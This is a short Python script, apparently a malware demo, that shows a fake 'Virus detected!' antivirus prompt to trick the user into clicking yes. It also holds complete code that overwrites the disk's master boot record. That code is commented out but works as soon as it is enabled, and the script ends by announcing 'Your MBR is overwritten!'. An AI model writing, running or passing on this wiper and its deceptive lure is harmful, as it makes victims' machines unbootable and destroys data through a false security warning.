from win32file import * # pip install pywin32
from win32ui import * # MessageBox
from win32con import * # MessageBox buttons
from win32gui import *
from sys import exit

# title of warning
warningtitle = 'Virus detected!'
# description of warning
warningdescription = 'A virus is on your machine.\nDo you want to launch antivirus now?'

# if MessageBox(warningdescription, warningtitle, MB_ICONSTOP | MB_YESNO) == 7: # send warning and check if no is pressed
#   exit() # exit the program

if MessageBox(None, warningdescription, warningtitle, MB_ICONSTOP| MB_YESNO) == 7:
  exit()

# hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0) # Create a handle to our Physical Drive
# WriteFile(hDevice, AllocateReadBuffer(512), None) # Overwrite the MBR! (Never run this on your main machine!)
# CloseHandle(hDevice) # Close the handle to our Physical Drive!

MessageBox(None,"Your MBR is overwritten!", "Oh No!", MB_ICONHAND| MB_OK)
